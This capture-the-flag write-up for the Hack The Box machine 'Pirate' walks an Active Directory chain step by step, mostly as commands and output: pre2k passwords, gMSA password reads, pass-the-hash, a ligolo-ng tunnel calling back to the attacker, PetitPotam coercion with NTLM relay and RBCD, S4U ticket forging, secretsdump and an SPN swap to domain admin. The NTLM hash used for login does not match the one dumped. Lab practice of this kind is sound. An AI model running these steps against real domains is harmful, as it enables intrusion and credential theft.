---
title: "HTB: Pirate"
date: 2026-04-06
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - windows
  - hard
  - active-directory
  - gmsa
  - pre2k
  - rbcd
  - ntlm-relay
  - coercion
  - s4u2self
  - kerberos
  - pivoting
  - ligolo-ng
description: "Pre2k machine accounts give up a gMSA, then coercion plus RBCD plus an SPN swap walks me from a foothold to Domain Admin."
summary: "Pre2k machine accounts give up a gMSA, then coercion plus RBCD plus an SPN swap walks me from a foothold to Domain Admin."
cover:
  image: "/images/htb-pirate/info-card.png"
  alt: "HTB Pirate"
  relative: false
showToc: true
TocOpen: false
---

## Box Info

| OS      | Difficulty | Release |
| ------- | ---------- | ------- |
| Windows | Hard       | 2026    |

### Kill chain

| # | Action | Result |
|---|--------|--------|
| 1 | Enumerate AD with provided `pentest` creds | User list, no kerberoastable creds |
| 2 | Pre2k check via NetExec | `MS01$:ms01` default password |
| 3 | Read `msDS-ManagedPassword` on `gMSA_ADFS_prod$` | NT hash for the gMSA |
| 4 | WinRM in as `gMSA_ADFS_prod$` | Foothold on DC01 |
| 5 | fscan over the second NIC | `WEB01` discovered at `192.168.100.2` |
| 6 | Pivot via ligolo-ng | Routable into the internal subnet |
| 7 | Coerce WEB01 with PetitPotam, relay to LDAP, set RBCD | Control over WEB01 via fake computer |
| 8 | S4U as Administrator, psexec WEB01 | SYSTEM on WEB01 |
| 9 | `secretsdump` WEB01 | Cleartext password for `a.white` |
| 10 | `a.white` has `ForceChangePassword` over `a.white_adm` | Password reset on the admin account |
| 11 | `a.white_adm` is in IT, swap an SPN from WEB01 to DC01 | Existing ST becomes valid for DC01 |
| 12 | S4U2Self with altservice `cifs/dc01`, psexec | SYSTEM on DC01, Domain Admin |

## Recon

### nmap

The box is a Windows DC, the standard AD port salad shows up immediately.

```console
$ nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389 -sCV 10.129.13.146
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows
```

Hostname is `DC01.pirate.htb`. Nothing else is listening that I care about, IIS on 80 is just the default page. Throw the names into `/etc/hosts` and move on.

```console
$ echo "10.129.13.146 dc01.pirate.htb pirate.htb dc01" | sudo tee -a /etc/hosts
```

## Shell as gMSA_ADFS_prod$

The box ships with credentials, `pentest:p3nt3st2025!&`. That gives me an authenticated starting point against the domain.

### AD enumeration

I cache a TGT so that everything that follows can run over Kerberos.

```console
$ impacket-getTGT pirate.htb/pentest:'p3nt3st2025!&' -dc-ip DC01.pirate.htb
$ export KRB5CCNAME=pentest.ccache
```

Pull the user list over LDAP.

```console
$ nxc ldap pirate.htb -u pentest -p 'p3nt3st2025!&' --users
LDAP   10.129.13.146  389  DC01  Administrator
LDAP   10.129.13.146  389  DC01  Guest
LDAP   10.129.13.146  389  DC01  krbtgt
LDAP   10.129.13.146  389  DC01  a.white_adm
LDAP   10.129.13.146  389  DC01  a.white
LDAP   10.129.13.146  389  DC01  pentest
LDAP   10.129.13.146  389  DC01  j.sparrow
```

Two `a.white` accounts and a captain on the crew. Kerberoasting returns a couple of hashes but they're not crackable, so that path is dead. I dump BloodHound data and move on.

```console
$ nxc ldap pirate.htb -u pentest -p 'p3nt3st2025!&' -k --kerberoasting hashes.txt
$ bloodhound-python -u pentest -p 'p3nt3st2025!&' -d pirate.htb -ns 10.129.13.146 -c All --zip
```

### Pre2k machine accounts

NetExec has a `pre2k` module that checks for computer accounts whose password is still the default lowercase computer name. It's a tiny check that costs nothing.

```console
$ nxc ldap pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
PRE2K  10.129.13.146  389  DC01  Pre-created computer account: MS01$
PRE2K  10.129.13.146  389  DC01  Pre-created computer account: EXCH01$
```

Two hits. `MS01$:ms01` works.

### Reading the gMSA password

In BloodHound, `MS01$` is a member of `Domain Secure Servers`, and that group has `ReadGMSAPassword` on `gMSA_ADFS_prod$`.

![BloodHound: MS01 reads gMSA_ADFS_prod password](/images/htb-pirate/bloodhound-gmsa-adfs.png)

Grab a TGT for `MS01$` and ask LDAP for the managed password attribute.

```console
$ impacket-getTGT pirate.htb/'MS01$':'ms01' -dc-ip DC01.pirate.htb
$ export KRB5CCNAME=MS01\$.ccache
$ bloodyAD -d pirate.htb -u 'MS01$' -k --host DC01.pirate.htb get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword
...[snip]...
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:fd9ea7ac7820dba5155bd6ed2d850c09
```

The gMSA is allowed to WinRM into the DC, so the NT hash is enough.

```console
$ evil-winrm -i DC01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8
```

![Evil-WinRM shell as gMSA_ADFS_prod$](/images/htb-pirate/winrm-gmsa-adfs.png)

There's no `user.txt` on this account, this is just a beachhead.

## Shell as SYSTEM on WEB01

### Finding the second network

`ipconfig` on DC01 shows a second NIC on `192.168.100.0/24`. There's another box hiding back there.

```console
PS C:\> ipconfig
...[snip]...
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

Upload `fscan.exe` to sweep the subnet from inside.

```console
PS C:\> .\fscan.exe -h 192.168.100.1/24
[*]192.168.100.2
   [->]WEB01
```

`WEB01` at `192.168.100.2`. Add it to `/etc/hosts` and set up a tunnel so I don't have to do everything from the DC shell.

### Pivoting with ligolo-ng

```console
$ ./proxy -selfcert
ligolo-ng » ifcreate --name ligolo
ligolo-ng » route_add --name ligolo --route 192.168.100.0/24
```

```console
PS C:\> Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.15.229:11601 -ignore-cert" -WindowStyle Hidden
```

```console
ligolo-ng » session
ligolo-ng » start
```

WEB01 is now reachable from my Kali box as if it were on the local network.

### Coercion + NTLM relay + RBCD

NetExec's `coerce_plus` module quickly tells me what's exposed.

```console
$ nxc smb web01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8 -M coerce_plus
SMB         192.168.100.2  445  WEB01  signing:False
COERCE_PLUS 192.168.100.2  445  WEB01  VULNERABLE, PetitPotam
COERCE_PLUS 192.168.100.2  445  WEB01  VULNERABLE, PrinterBug
COERCE_PLUS 192.168.100.2  445  WEB01  VULNERABLE, MSEven
```

SMB signing is off on WEB01 and it can be coerced. That's the classic recipe for an unauthenticated NTLM relay: coerce WEB01 into authenticating to me, relay that machine account to LDAP on the DC, and write a Resource-Based Constrained Delegation entry that lets me impersonate any user to WEB01.

Spin up `ntlmrelayx` against LDAP, ask for an interactive shell, and add `--delegate-access`/`--remove-mic` so that it does the RBCD setup automatically.

```console
$ impacket-ntlmrelayx -t ldap://DC01.pirate.htb -i --delegate-access -smb2support --remove-mic
```

Trigger the coercion.

```console
$ nxc smb web01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8 -M coerce_plus -o LISTENER=10.10.15.229
```

The relay catches `WEB01$` authenticating and drops me an LDAP shell on port 11000.

```console
$ nc 127.0.0.1 11000
# start_tls
# add_computer fakecomp$ FakePass123!
# set_rbcd WEB01$ fakecomp$
```

`fakecomp$` can now act as any user to `cifs/web01.pirate.htb`. Time to pull a service ticket as Administrator with S4U2Self/S4U2Proxy.

```console
$ impacket-getST -spn 'cifs/web01.pirate.htb' -impersonate Administrator -dc-ip 10.129.244.95 'pirate.htb/fakecomp$:FakePass123!'
$ export KRB5CCNAME=$(pwd)/Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
```

Impacket needs a sane `krb5.conf` to actually use the ticket, so I write one.

```console
$ sudo bash -c 'printf "[libdefaults]\ndefault_realm = PIRATE.HTB\ndns_lookup_kdc = false\ndns_lookup_realm = false\n\n[realms]\nPIRATE.HTB = {\nkdc = dc01.pirate.htb\nadmin_server = dc01.pirate.htb\n}\n\n[domain_realm]\n.pirate.htb = PIRATE.HTB\npirate.htb = PIRATE.HTB\n" > /etc/krb5.conf'
```

Then psexec across the tunnel.

```console
$ impacket-psexec -k -no-pass -dc-ip 10.129.244.95 web01.pirate.htb
```

![SYSTEM on WEB01](/images/htb-pirate/system-shell.png)

SYSTEM on WEB01.

![Full SYSTEM shell on WEB01](/images/htb-pirate/web01-system-shell.png)

## Shell as a.white_adm

WEB01 is an internal box, no one to grab `user.txt` from yet. I dump local secrets to see what passwords are cached.

```console
$ export KRB5CCNAME=$(pwd)/Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
$ impacket-secretsdump -k -no-pass -dc-ip 10.129.244.95 web01.pirate.htb
...[snip]...
PIRATE\a.white:E2nvAOKSz5Xz2MJu
...[snip]...
```

Cleartext password for `a.white`. Back in BloodHound, `a.white` has `ForceChangePassword` over `a.white_adm`.

![BloodHound: a.white ForceChangePassword on a.white_adm](/images/htb-pirate/bloodhound-awhite-forcechange.png)

Reset it with bloodyAD.

```console
$ bloodyAD --host dc01.pirate.htb -d pirate.htb -u a.white -p 'E2nvAOKSz5Xz2MJu' set password a.white_adm 'UserP@ssw0rd'
```

`user.txt` lives on `a.white`'s desktop on WEB01.

```console
$ cat user.txt
a28c22c7************************
```

## Shell as SYSTEM on DC01

`a.white_adm` is a member of the `IT` group, and BloodHound shows `IT` has `WriteSPN` on every server in the domain, including DC01.

![BloodHound: IT WriteSPN on DC01, WEB01, MS01, EXCH01](/images/htb-pirate/bloodhound-it-writespn.png)

This is the trick I keep meaning to internalise: when you already hold a service ticket for one host (here `cifs/web01.pirate.htb` from the relay step) and you can edit SPNs, you can move an SPN like `HTTP/WEB01.pirate.htb` off WEB01 and onto DC01. Then you ask the KDC for a new ticket with `-altservice cifs/dc01.pirate.htb`. Because `HTTP/WEB01` is now registered on DC01's account, the KDC happily issues a CIFS ticket for DC01 using DC01's key.

Drive LDAP with msldap and swap the SPN.

```console
$ msldap 'ldap+ntlm-password://pirate.htb\a.white_adm:UserP@ssw0rd@dc01.pirate.htb'
# delspn "CN=WEB01,CN=Computers,DC=pirate,DC=htb" "HTTP/WEB01.pirate.htb"
# addspn "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb" "HTTP/WEB01.pirate.htb"
```

Clear any sticky ticket from the env and request the new ST.

```console
$ unset KRB5CCNAME
$ impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate Administrator -altservice 'cifs/dc01.pirate.htb' -dc-ip 10.129.244.95 'pirate.htb/a.white_adm:UserP@ssw0rd'
$ export KRB5CCNAME=$(pwd)/Administrator@cifs_dc01.pirate.htb@PIRATE.HTB.ccache
```

```console
$ impacket-psexec -k -no-pass -dc-ip 10.129.244.95 dc01.pirate.htb
```

![SYSTEM shell on DC01](/images/htb-pirate/dc01-system-shell.png)

Domain owned.

```console
C:\> type C:\Users\Administrator\Desktop\root.txt
410efd74************************
```

## Credentials

| User                | Password / Hash                             | Source                          |
| ------------------- | ------------------------------------------- | ------------------------------- |
| pentest             | `p3nt3st2025!&`                             | provided                        |
| MS01$               | `ms01`                                      | pre2k default                   |
| gMSA_ADFS_prod$     | NTLM `fd9ea7ac7820dba5155bd6ed2d850c09`     | `msDS-ManagedPassword` via LDAP |
| fakecomp$           | `FakePass123!`                              | created via relayed LDAP shell  |
| a.white             | `E2nvAOKSz5Xz2MJu`                          | `secretsdump` on WEB01          |
| a.white_adm         | `UserP@ssw0rd`                              | `ForceChangePassword` from a.white |
